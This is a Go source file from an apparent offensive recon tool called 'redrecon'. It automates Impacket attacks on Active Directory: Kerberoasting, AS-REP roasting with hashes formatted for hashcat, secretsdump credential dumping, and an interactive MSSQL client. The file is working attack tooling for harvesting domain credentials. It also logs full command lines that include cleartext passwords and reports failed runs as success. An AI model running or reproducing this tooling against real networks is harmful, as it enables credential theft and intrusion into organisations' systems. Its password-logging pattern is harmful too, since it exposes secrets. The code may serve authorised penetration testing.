package tools

import (
	"context"
	"fmt"
	"log/slog"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"

	"redrecon/internal/config"
	"redrecon/pkg/types"
	"redrecon/pkg/utils"
)

// RunKerberoasting executa o script GetUserSPNs.py do Impacket.
func RunKerberoasting(ctx context.Context, domain string, creds types.Credentials, outputFile string, logger *slog.Logger) error {
	return runImpacketScript(ctx, "GetUserSPNs.py", domain, creds, outputFile, logger, "-request")
}

// RunASRepRoasting executa o script GetNPUsers.py do Impacket.
func RunASRepRoasting(ctx context.Context, domain string, creds types.Credentials, outputFile string, logger *slog.Logger) error {
	return runImpacketScript(ctx, "GetNPUsers.py", domain, creds, outputFile, logger, "-request", "-format", "hashcat")
}

// runImpacketScript é uma função auxiliar para executar scripts do Impacket.
// Tenta executar via PATH (ex: impacket-secretsdump ou secretsdump.py) ou fallback para source.
func runImpacketScript(ctx context.Context, scriptName, domain string, creds types.Credentials, outputFile string, logger *slog.Logger, extraArgs ...string) error {
	if !config.Cfg.Tools.Impacket.Enabled {
		logger.Info(fmt.Sprintf("Impacket (%s) is disabled in config, skipping.", scriptName))
		return nil
	}

	// 1. Tentar encontrar o binário no PATH (vários padrões comuns)
	// Padrões: impacket-secretsdump, secretsdump.py, secretsdump
	baseName := strings.TrimSuffix(scriptName, ".py")
	candidates := []string{
		"impacket-" + baseName, // ex: impacket-secretsdump
		scriptName,             // ex: secretsdump.py
		baseName,               // ex: secretsdump
	}

	var cmd *exec.Cmd
	foundBinary := ""

	for _, bin := range candidates {
		if path, err := exec.LookPath(bin); err == nil {
			foundBinary = path
			break
		}
	}

	// Se não achou no PATH, tenta usar o caminho configurado (source)
	if foundBinary == "" {
		impacketPath := config.GetToolPath("impacket")
		scriptPath := filepath.Join("examples", scriptName)
		if utils.DirExistsAndIsNotEmpty(impacketPath) {
			logger.Info("Using Impacket from source", "path", impacketPath)
			cmd = exec.CommandContext(ctx, "python3", append([]string{scriptPath}, buildImpacketArgs(domain, creds, outputFile, extraArgs...)...)...)
			cmd.Dir = impacketPath
		} else {
			return fmt.Errorf("impacket tool '%s' not found in PATH and source path '%s' is invalid", scriptName, impacketPath)
		}
	} else {
		logger.Info("Using system Impacket tool", "binary", foundBinary)
		cmd = exec.CommandContext(ctx, foundBinary, buildImpacketArgs(domain, creds, outputFile, extraArgs...)...)
	}

	logger.Info(fmt.Sprintf("Running Impacket script %s", scriptName), "command", cmd.String())

	// Captura output para debug se falhar
	output, err := cmd.CombinedOutput()
	if err != nil {
		logger.Warn(fmt.Sprintf("Impacket script %s finished with an error", scriptName), "error", err, "output", string(output))
		// Loga o output no arquivo de erro ou só warning
		if len(output) > 0 {
			logger.Debug("Impacket output", "output", string(output))
		}
	}
	return nil
}

// buildImpacketArgs constrói os argumentos comuns
func buildImpacketArgs(domain string, creds types.Credentials, outputFile string, extraArgs ...string) []string {
	// Construindo o FQDN para autenticação: DOMAIN/USER:PASSWORD@DOMAIN
	authPrincipal := ""
	if creds.Username != "" {
		if creds.Domain != "" {
			authPrincipal += creds.Domain + "/"
		}
		authPrincipal += creds.Username
		if creds.Password != "" {
			authPrincipal += ":" + creds.Password
		}
	}

	args := []string{}
	// Se authPrincipal não for vazio, adicionamos. NOTA: GetUserSPNs requer isso.
	if authPrincipal != "" {
		args = append(args, authPrincipal)
	}

	if outputFile != "" {
		args = append(args, "-outputfile", outputFile)
	}

	args = append(args, extraArgs...)
	return args
}

// RunSecretsDump executes the secretsdump.py script from Impacket.
func RunSecretsDump(ctx context.Context, domain string, creds types.Credentials, outputFile string, logger *slog.Logger) error {
	// secretsdump requer target IP/Hostname. 'domain' aqui vindo do caller deveria ser o target.
	// O caller passa 'domain' como argumento 'domain'.
	// Se quisermos rodar contra um DC específico, precisamos passar o IP.
	// Vamos assumir que 'domain' é o domínio DNS ou IP do DC alvo.
	return runImpacketScript(ctx, "secretsdump.py", domain, creds, outputFile, logger)
}

// RunMSSQLClient executes the mssqlclient.py script from Impacket for interactive SQL shell.
func RunMSSQLClient(ctx context.Context, target string, domain string, creds types.Credentials, useWindowsAuth bool, logger *slog.Logger) error {
	if !config.Cfg.Tools.Impacket.Enabled {
		logger.Info("Impacket is disabled in config, skipping mssqlclient.")
		return nil
	}

	// 1. Tentar encontrar o binário
	candidates := []string{
		"impacket-mssqlclient",
		"mssqlclient.py",
		"mssqlclient",
	}

	var cmd *exec.Cmd
	foundBinary := ""

	for _, bin := range candidates {
		if path, err := exec.LookPath(bin); err == nil {
			foundBinary = path
			break
		}
	}

	// Construct auth string: [[domain/]username[:password]@]target
	authString := ""
	if creds.Username != "" {
		// Only prepend domain if using Windows Auth or explicitly requested via domain param
		if domain != "" && useWindowsAuth {
			authString += domain + "/"
		}
		authString += creds.Username
		if creds.Password != "" {
			authString += ":" + creds.Password
		}
		authString += "@" + target
	} else {
		return fmt.Errorf("credentials required for mssqlclient")
	}

	if foundBinary == "" {
		// Source fallback
		impacketPath := config.GetToolPath("impacket")
		scriptPath := filepath.Join("examples", "mssqlclient.py")
		if utils.DirExistsAndIsNotEmpty(impacketPath) {
			args := []string{scriptPath, authString}
			if useWindowsAuth {
				args = append(args, "-windows-auth")
			}
			cmd = exec.CommandContext(ctx, "python3", args...)
			cmd.Dir = impacketPath
		} else {
			return fmt.Errorf("mssqlclient tool not found in PATH and source path not valid")
		}
	} else {
		args := []string{authString}
		if useWindowsAuth {
			args = append(args, "-windows-auth")
		}
		cmd = exec.CommandContext(ctx, foundBinary, args...)
	}

	// Interactive mode setup
	cmd.Stdin = os.Stdin
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	logger.Info("Starting Interactive MSSQL Client", "command", cmd.String())

	// Ignore SIGINT in parent (redrecon) while child runs
	// Child will receive SIGINT from TTY and handle it (e.g. abort current query)
	// Parent must stay alive to wait for child.
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sigChan)

	// Goroutine to consume signals so channel doesn't block, but mostly we just want to NOT exit.
	go func() {
		for range sigChan {
			// Do nothing, let child handle it
		}
	}()

	return cmd.Run()
}
